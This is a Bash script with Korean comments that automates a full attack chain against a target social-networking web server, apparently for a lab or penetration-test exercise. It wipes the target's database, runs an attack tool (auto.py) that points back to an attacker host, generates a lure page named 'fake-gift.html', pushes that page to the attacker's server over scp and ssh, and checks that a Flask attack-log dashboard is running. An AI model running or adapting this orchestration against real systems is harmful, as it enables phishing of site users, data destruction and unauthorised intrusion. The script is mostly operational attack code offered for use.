#!/bin/bash

# 전체 공격 자동화 스크립트
# 사용법: ./run_attack.sh <TARGET_IP> <ATTACKER_IP>
# 예: ./run_attack.sh 15.164.95.252 13.158.67.78

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "사용법: ./run_attack.sh <TARGET_IP> <ATTACKER_IP>"
    echo "예: ./run_attack.sh 15.164.95.252 13.158.67.78"
    exit 1
fi

TARGET_IP="$1"
ATTACKER_IP="$2"
ATTACKER_PORT="5000"

echo "============================================================"
echo "🎯 자동 공격 실행"
echo "============================================================"
echo "타겟 IP:    $TARGET_IP"
echo "공격자 IP:  $ATTACKER_IP:$ATTACKER_PORT"
echo "============================================================"
echo ""

# 1단계: 타겟 서버 DB 초기화
echo "📍 1단계: 타겟 서버 DB 초기화"
echo "------------------------------------------------------------"
./clear_target_db.sh "$TARGET_IP"

if [ $? -ne 0 ]; then
    echo "❌ DB 초기화 실패 - 중단됨"
    exit 1
fi

echo ""
echo "✅ DB 초기화 완료"
echo ""
sleep 2

# 2단계: 공격 실행 및 fake-gift.html 생성
echo "📍 2단계: 공격 실행 (auto.py)"
echo "------------------------------------------------------------"
python3 auto.py "http://$TARGET_IP" "http://$ATTACKER_IP:$ATTACKER_PORT"

if [ $? -ne 0 ]; then
    echo "❌ 공격 실패 - 중단됨"
    exit 1
fi

echo ""
echo "✅ 공격 완료"
echo ""
sleep 2

# 3단계: fake-gift.html 확인
if [ ! -f "reports/fake-gift.html" ]; then
    echo "❌ reports/fake-gift.html이 생성되지 않았습니다!"
    exit 1
fi

echo "✅ fake-gift.html 생성됨"
echo ""

# 4단계: Attacker 서버 업데이트
echo "📍 3단계: Attacker 서버 업데이트"
echo "------------------------------------------------------------"

echo "🗑️  Attacker 서버의 기존 fake-gift.html 삭제 중..."
ssh -i ~/.ssh/id_rsa ubuntu@"$ATTACKER_IP" << EOF
    if [ -f fake-gift.html ]; then
        echo "✅ 기존 파일 삭제"
        rm -f fake-gift.html
    else
        echo "ℹ️  기존 파일 없음"
    fi
EOF

echo ""
echo "📤 새로운 fake-gift.html 업로드 중..."
scp -i ~/.ssh/id_rsa reports/fake-gift.html ubuntu@"$ATTACKER_IP":~/

if [ $? -ne 0 ]; then
    echo "❌ 업로드 실패!"
    exit 1
fi

echo "✅ 업로드 완료"
echo ""

# 5단계: 확인
echo "📍 4단계: 배포 확인"
echo "------------------------------------------------------------"
ssh -i ~/.ssh/id_rsa ubuntu@"$ATTACKER_IP" << EOF
    echo "📂 파일 목록:"
    ls -lh fake-gift.html attacker_server.py 2>/dev/null || echo "일부 파일 없음"

    echo ""
    echo "🔍 fake-gift.html 안의 IP 주소:"
    grep -o "http://[0-9.:]*/[^'\"]*" fake-gift.html | head -3

    echo ""
    echo "🔌 Flask 서버 상태:"
    if ps aux | grep -q "[a]ttacker_server.py"; then
        echo "✅ Flask 서버 실행 중"
    else
        echo "⚠️  Flask 서버가 실행되지 않았습니다!"
        echo ""
        echo "다음 명령으로 시작하세요:"
        echo "  ssh -i ~/.ssh/id_rsa ubuntu@$ATTACKER_IP"
        echo "  python3 attacker_server.py"
    fi
EOF

echo ""
echo "============================================================"
echo "✅ 전체 작업 완료!"
echo "============================================================"
echo ""
echo "🌐 테스트 URL:"
echo "  타겟 SNS:        http://$TARGET_IP"
echo "  Fake Gift:       http://$ATTACKER_IP:$ATTACKER_PORT/fake-gift"
echo "  대시보드:        http://$ATTACKER_IP:$ATTACKER_PORT/"
echo ""
echo "📊 리포트 위치:"
echo "  reports/security_report_*.html"
echo "  reports/security_report_*.md"
echo "  reports/security_report_*.json"
echo ""
echo "다음 단계:"
echo "  1. 타겟 SNS에 접속: http://$TARGET_IP"
echo "  2. 피드에서 게시물 확인"
echo "  3. 링크 클릭 테스트"
echo "  4. 대시보드에서 공격 로그 확인: http://$ATTACKER_IP:$ATTACKER_PORT/"
echo ""
